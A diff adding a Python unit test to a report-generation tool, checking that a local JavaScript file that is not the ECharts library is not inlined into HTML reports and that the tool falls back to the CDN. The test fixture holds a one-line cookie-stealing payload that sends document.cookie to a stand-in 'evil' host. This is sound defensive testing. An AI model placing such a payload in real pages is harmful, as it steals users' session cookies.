@@ -166,6 +166,19 @@ async def test_missing_local_echarts_falls_back_to_cdn(tmp_path):
     assert DEFAULT_ECHARTS_SRC in page
 
 
+async def test_non_echarts_local_file_not_inlined(tmp_path):
+    """A local echarts_src pointing at a non-echarts file is NOT inlined (would
+    inject arbitrary JS into every delivered report); falls back to the CDN."""
+    fake = tmp_path / "evil.js"
+    fake.write_text("fetch('//evil/?c='+document.cookie)", encoding="utf-8")
+    tool = HtmlReportTool(artifact_dir=tmp_path / "out", echarts_src=str(fake))
+    result = await tool.call(_input(file_name="r.html"))
+    assert result.is_error is False
+    page = (tmp_path / "out" / "r.html").read_text(encoding="utf-8")
+    assert "fetch('//evil" not in page  # arbitrary payload NOT inlined
+    assert DEFAULT_ECHARTS_SRC in page  # fell back to CDN
+
+
 # --- seam + routing ---------------------------------------------------------
 
 
